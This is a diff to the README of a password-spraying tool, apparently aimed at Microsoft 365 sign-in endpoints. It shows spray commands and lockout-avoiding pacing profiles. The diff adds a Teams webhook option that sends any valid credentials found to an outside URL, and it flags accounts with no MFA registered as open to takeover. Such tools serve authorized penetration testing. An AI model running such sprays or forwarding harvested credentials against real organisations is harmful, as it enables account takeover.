@@ -176,6 +176,7 @@ options:
                          - stealth: 1 worker,  30.0s delay,  1 pass/chunk,   20m lockout,  1 safe threshold, 40% jitter
   --continue-on-success
                         Continue the assessment even after finding valid credentials.
+  --webhook WEBHOOK     Microsoft Teams webhook URL for valid-credential alerts. If omitted, falls back to the APIMSPRAY_WEBHOOK env var, then a webhook.txt file.
 ```
 
 ### Modes
@@ -234,6 +235,27 @@ By default each request randomly picks one of four built-in first-party client a
 python3 apimspray.py --urls urls.txt --mode spray --users users.txt --passwords p.txt \
     --client-id 1fec8e78-bce4-4aaf-ab1b-5451cc387264 --resource https://outlook.office365.com
 ```
+
+### Notifications (Teams webhook)
+
+Get a Microsoft Teams alert the moment a **valid credential** is found. The webhook URL is resolved in this order (first match wins):
+
+1. `--webhook <url>`
+2. `$APIMSPRAY_WEBHOOK` environment variable
+3. a `webhook.txt` file next to the script (or in the current directory), first line
+
+```bash
+# any of these enables notifications
+python3 apimspray.py ... --webhook 'https://<power-automate-workflow-url>'
+export APIMSPRAY_WEBHOOK='https://<power-automate-workflow-url>'
+echo 'https://<power-automate-workflow-url>' > webhook.txt
+```
+
+Works with the current Teams **Workflows** (Power Automate) webhooks as well as legacy connector webhooks — the payload is sent as a `message` with an Adaptive Card. If none is configured, notifications are silently disabled; a failed POST only prints a warning and never interrupts the spray.
+
+Each alert card includes the credentials, the result classification, the `client_id`, the resource, and the scope. The title escalates to **"MFA enrollment available — possible account takeover"** for `AADSTS50079` (valid password with **no MFA method registered**, so an operator can self-enroll one). The scope shown is the **granted** scope when a token was actually issued (`VALID (Token)`), otherwise the **requested** scope, labeled accordingly.
+
+> **Tip:** keep the webhook URL out of git — `webhook.txt` is a secret. Prefer the env var, or add `webhook.txt` to `.gitignore`.
 
 ### Pacing Profiles
 
